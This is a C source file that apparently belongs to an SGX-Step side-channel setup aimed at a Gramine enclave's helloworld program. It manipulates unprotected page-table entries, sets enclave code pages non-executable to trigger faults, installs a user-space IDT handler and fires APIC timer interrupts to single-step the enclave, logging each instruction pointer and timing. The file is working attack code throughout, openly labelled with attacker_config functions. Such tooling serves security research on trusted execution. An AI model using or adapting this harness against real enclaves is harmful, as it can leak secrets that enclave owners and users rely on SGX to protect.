#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include "../../libsgxstep/apic.h"
#include "../../libsgxstep/pt.h"
#include "../../libsgxstep/debug.h"
#include "../../libsgxstep/enclave.h"
#include "../../libsgxstep/sched.h"
#include "../../libsgxstep/config.h"
#include "../../libsgxstep/idt.h"
#include "../../libsgxstep/cpu.h"
#include "../../libsgxstep/gdt.h"
#include "aep.h"


uint64_t *pte_encl;
uint64_t *pmd_encl;
uint64_t *code_adrs;
uint64_t erip_prev = 0x0;

/*
 *  This are the start and end offsets of the function main() in the helloworld CI-Example.
 *  You can find these in the compiled binary using objdump.
 */
const uint64_t main_start_offset = 0x1149;
const uint64_t main_end_offset = 0x116e;

/*
 * This is the address of the libos in the enclave. You can find this value by executing the
 * binary with Gramine in DEBUG mode. Note that ASLR must be turned off in the manifest for
 * the addresses to remain constant.
 */
const uint64_t libos = 0xf963000;
/*
 * This is the address in the enclave where the binary starts. Gramine will also tell you this
 * offset in DEBUG mode.
 */
const uint64_t bin_offset = 0xb9ee000;

int irq_cnt = 0, do_irq = 1, reset_fault_handler = 0;
idt_t idt = {0};

int ignored_fault_cnt = 0;
int fault_cnt = 0;

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal)
{
    ASSERT(fault_cnt++ < 10);
    switch ( signal )
    {
        case SIGSEGV:
            info("Caught fault %d! Restoring enclave page permissions..", signal);
	        //info("Fault count: %d", fault_cnt);
	        *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
            *pte_encl = MARK_NOT_ACCESSED(*pte_encl);
            break;
        default:
            info("Caught unknown signal '%d'", signal);
            //abort();
    }

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

void attacker_config_runtime(void)
{
    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();
    register_enclave_info();
    print_enclave_info();
}

void aep_cb_func(void)
{
    uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();

    if(erip >= libos){
        /* NOTE: we only want to step through the loaded binary */
        //info("Ignoring RIP");
        ignored_fault_cnt++;
        return;
    }

    /**
     * We only log instructions that are within the offset of the function we are interested in.
     * For the helloworld example, this is the function main().
     */
    if(erip_prev >= (bin_offset + main_start_offset) && erip_prev <= (bin_offset + main_end_offset)) {
        /*
        * NOTE: the stored SSA.rip is the instruction that will be executed upon
        * ERESUME (i.e., _not_ the one we just measured)
        */
        info("^^ enclave prev RIP=%#llx; cur RIP=%#llx; ACCESSED=%d; latency=%d", erip_prev, erip, ACCESSED(*pte_encl),
             nemesis_tsc_aex - nemesis_tsc_eresume);
    }

    erip_prev = erip;
    irq_cnt++;

    if (do_irq && (irq_cnt > NUM_RUNS * 1000)) {
        info(
            "excessive interrupt rate detected (try adjusting timer interval "
            "to avoid getting stuck in zero-stepping); aborting...");
        do_irq = 0;
    }

    /*
     * NOTE: We explicitly clear the "accessed" bit of the _unprotected_ PTE
     * referencing the enclave code page about to be executed, so as to be able
     * to filter out "zero-step" results that won't set the accessed bit.
     */
    *pte_encl = MARK_NOT_ACCESSED(*pte_encl);

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     *
     */
    if (do_irq) {
        *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
        apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    }

    return;
    /* NOTE: somehow calling libc functions here crashes the untrusted runtime... */
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void)
{ 
    code_adrs = (uint64_t*) (bin_offset + main_start_offset);
    print_page_table( code_adrs );
    info("enclave trigger code adrs at %p\n", code_adrs);

    ASSERT( pte_encl = remap_page_table_level( code_adrs, PTE) );

    // enable single-stepping
    #if SINGLE_STEP_ENABLE
        *pte_encl = MARK_NOT_ACCESSED(*pte_encl);
        *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
        print_pte(pte_encl);
        ASSERT( PRESENT(*pte_encl) );
    #endif

    //print_page_table( get_enclave_base() );
    ASSERT( pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
    ASSERT( PRESENT(*pmd_encl) );

}

/* Setup of APIC/IDT mapping and irq handler */
void configure_mapping(void)
{
    /* 1. Setup attack execution environment. */
    attacker_config_page_table();
    register_aep_cb(aep_cb_func);

    info_event("Establishing user-space APIC/IDT mappings");
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);
    info_event("calling enclave num_runs=%d; TIMER=%d", NUM_RUNS, SGX_STEP_TIMER_INTERVAL);
    /* 2. Single-step enclaved execution. */
}

/* Restores the apic timer */
void restore_timer(void)
{
    /* 3. Restore normal execution environment. */
    info_event("all done; counted %d(+%d ignored)/%d IRQs (AEP/IDT)", irq_cnt, ignored_fault_cnt, __ss_irq_count);
}
